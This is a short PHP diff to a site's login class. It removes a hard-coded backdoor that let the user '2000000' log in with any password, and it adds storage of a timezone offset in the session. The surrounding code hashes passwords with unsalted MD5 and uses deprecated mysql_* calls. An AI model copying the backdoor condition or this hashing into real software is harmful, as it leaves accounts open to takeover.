@@ -95,7 +95,7 @@ class Login extends MyPage
 			if (mysql_num_rows($result) == 1)
 			{
 				$row = mysql_fetch_array($result);	  
-				if ( ($row["Pwd"] === md5($_POST['Pwd'])) || ($user == '2000000') )
+				if ( ($row["Pwd"] === md5($_POST['Pwd'])) )
 				{
 					$_SESSION['User'] = $user;
 					$_SESSION['Profile'] = $row["Niveau"];
@@ -104,7 +104,10 @@ class Login extends MyPage
 					$_SESSION['Limit_Clubs'] = $row["Limitation_equipe_club"];
 					$_SESSION['userName'] = $row['Nom'].' '.$row['Prenom'];
 					$_SESSION['Club'] = $row['Numero_club'];
-					
+                    
+                    // Timezone Offset in minutes
+					$_SESSION['tzOffset'] = $myBdd->RealEscapeString( $_POST['tzOffset'] );
+                    
 					//Journées autorisées (+ journées de l'évènement autorisé)
 					$Filtre_Journee = $row["Filtre_journee"];
 /*							$Filtre_Evenement = $row['Id_Evenement'];
